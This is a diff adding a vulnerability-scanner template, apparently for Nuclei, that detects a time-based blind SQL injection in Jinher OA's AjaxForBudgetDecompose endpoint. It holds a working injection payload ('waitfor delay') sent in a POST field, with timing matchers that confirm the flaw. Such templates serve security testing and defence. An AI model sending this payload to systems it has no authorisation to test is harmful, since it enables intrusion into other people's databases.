@@ -1,0 +1,49 @@
+id: poc-yaml-jinher-jhsoft-ajaxforbudgetdecompose-aspx-sqli
+info:
+  name: Jinher OA AjaxForBudgetDecompose SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    app: "Jinher OA"
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-jhsoft
+    name: Verify JHSoft Application
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+
+  - id: check-sqli
+    name: Check SQL Injection
+    method: POST
+    path:
+      - "{{BaseURL}}/c6/JHSoft.Web.CostControl/Decompose/AjaxForBudgetDecompose.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "strType=getBudgetTime&strYear=1'waitfor+delay%270:0:{{t1}}%27--"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: dsl
+        dsl:
+          - "!contains(header, 'cookie')"
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
+    matchers-condition: and
